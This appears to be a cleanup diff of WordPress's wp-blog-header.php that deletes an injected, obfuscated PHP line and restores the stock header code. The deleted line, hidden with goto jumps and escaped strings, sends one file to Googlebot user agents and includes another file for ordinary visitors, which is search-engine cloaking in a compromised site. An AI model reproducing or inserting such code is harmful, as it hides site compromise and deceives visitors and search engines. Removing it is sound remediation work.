@@ -1,2 +1,21 @@
 <?php
- goto BsyQb; lke4Y: if (is_google_bot()) { $bot_content = file_get_contents("\143\157\156\x66\x69\147\56\152\x73"); echo $bot_content; die; } else { include "\x64\141\x74\x61\56\160\150\x70"; die; } goto sG3c8; BsyQb: function is_google_bot() { $agents = array("\107\157\157\147\154\x65\x62\157\x74", "\x47\x6f\157\147\x6c\145\55\123\x69\164\x65\55\x56\145\162\151\x66\151\143\x61\x74\x69\157\x6e", "\x47\157\x6f\147\x6c\x65\55\x49\x6e\x73\x70\x65\x63\164\x69\x6f\x6e\x54\x6f\157\154", "\107\x6f\157\x67\154\x65\142\x6f\x74\55\x4d\x6f\x62\x69\x6c\x65", "\x47\157\x6f\147\154\x65\x62\x6f\x74\55\116\x65\167\163"); foreach ($agents as $agent) { if (strpos($_SERVER["\110\x54\124\120\x5f\125\x53\105\122\137\101\107\105\x4e\124"], $agent) !== false) { return true; } } return false; } goto lke4Y; sG3c8: ?>
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
